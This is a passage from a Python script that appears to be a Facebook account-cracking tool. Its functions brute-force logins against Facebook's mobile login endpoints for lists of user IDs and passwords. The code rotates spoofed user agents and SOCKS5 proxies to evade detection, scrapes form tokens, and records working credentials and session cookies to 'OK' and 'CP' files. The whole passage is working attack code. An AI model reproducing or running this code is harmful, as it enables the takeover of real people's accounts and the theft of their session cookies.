#	ua_crack = ["Mozilla/5.0 (Linux; U; Android 4.1.1; zh-cn; HTC Z560e Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30; 360browser(securitypay,securityinstalled); 360(android,uppayplugin); 360 Aphone Browser (5.3.1)","Mozilla/5.0 (Linux; U; Android 4.3; zh-cn; HUAWEI Y600D-C00 Build/HUAWEIY600D-C00) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30; 360 Aphone Browser (6.9.3)","Mozilla/5.0 (Linux; U; Android 4.3; en-us; HUAWEI Y535D-C00 Build/HUAWEIY535D-C00) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30; 360browser(securitypay,securityinstalled); 360 Aphone Browser (Version 3.1.0ctch1)","Mozilla/5.0 (Linux; U; Android 4.1.2; zh-cn; HUAWEI Y321-C00 Build/HuaweiY321-C00) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30; 360browser(securitypay,securityinstalled); 360(android,uppayplugin); 360 Aphone Browser (2.0.4","Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; HUAWEI Y320-C00 Build/HuaweiY320-C00) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30; 360browser(securitypay,securityinstalled); 360 Aphone Browser (Version 3.1.0)","Mozilla/5.0 (Linux; U; Android 4.1.2; zh-cn; HUAWEI Y320-C00 Build/HuaweiY320-C00) AppleWebKit/534.30 (KHTML like Gecko) Version/4.0 Mobile Safari/534.30; 360browser(securitypaysecurityinstalled); 360 Aphone Browser (Version 3.1.0)","Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HUAWEI Y310-5000 Build/HuaweiY310-5000) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1; 360 Aphone Browser (6.9.9.50)","Mozilla/5.0 (Linux; U; Android 4.0.4; zh-cn; vivo S7 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30; 360browser(securitypay,securityinstalled); 360(android,uppayplugin); 360 Aphone Browser (2.0.5)","Mozilla/5.0 (Linux; U; Android 4.0.4; zh-cn; vivo S12 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30; 360browser(securitypay,securityinstalled); 360(android,uppayplugin); 360 Aphone Browser (1.0)"]
#	ua_crack = ["Mozilla/5.0 (Linux; U; Android 2.2.2; zh-cn; U8350 Build/HuaweiU8350) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1; 360browser(securitypay,securityinstalled); 360(android,uppayplugin); 360 Aphone Browser (5.1.5)","NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile","[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"]
#	u = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Linux; U; Android 4.0; en-us; LT28at Build/6.1.C.1.111) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"]
	ua = random.choice(ugent3)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	prog.update(des,description=f'\r[deep_white]{(HikmatXD)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				tree = Tree("")
				print(f'%s• %s• %sstatus crack  %s: %ssesi%s-%s'%(M,H,K,P,K,P,sekarang))
				tree.add("%suid pengguna  : %s%s"%(P,H,uiz))
				tree.add("%suid password  : %s%s"%(P,H,pw))
				tree.add("%stahun akun id : %s"%(P,tahun(uiz)))
				tree.add("%s%s\n"%(K,ua))
				cetak(tree)
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree("")
					print('%s• %s• %sstatus crack %s: %slive%s-%s'%(B,K,H,P,H,P,sekarang))
					tree.add("%suid pengguna  : %s%s"%(P,H,uiz))
					tree.add("%suid password  : %s%s"%(P,H,pw))
					tree.add("%stahun akun id : %s"%(P,tahun(uiz)))
					tree.add("%s%s"%(H,kuki))
					tree.add("%s%s\n"%(K,ua))
					cetak(tree)
#					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
#					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree("")
					print('%s• %s• %sstatus crack %s: %slive%s-%s'%(B,K,H,P,H,P,sekarang))
					tree.add("%suid pengguna  : %s%s"%(P,H,uiz))
					tree.add("%suid password  : %s%s"%(P,H,pw))
					tree.add("%stahun akun id : %s"%(P,tahun(uiz)))
					tree.add("%s%s"%(H,kuki))
					tree.add("%s%s\n"%(K,ua))
					cetak(tree)
#					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
#					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mobile_free_fire(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2F{link_okep}%2Fv6.0%2Fdialog%2Foauth&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2F'+link_okep+'%2Fv6.0%2Fdialog%2Foauth&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mobile_v2(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			#proxs2= {'http': 'socks4://'+nip}
			url = "m.facebook.com"
			headers1= {
				"Host": link_okep,
				"cache-control": "max-age=0",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
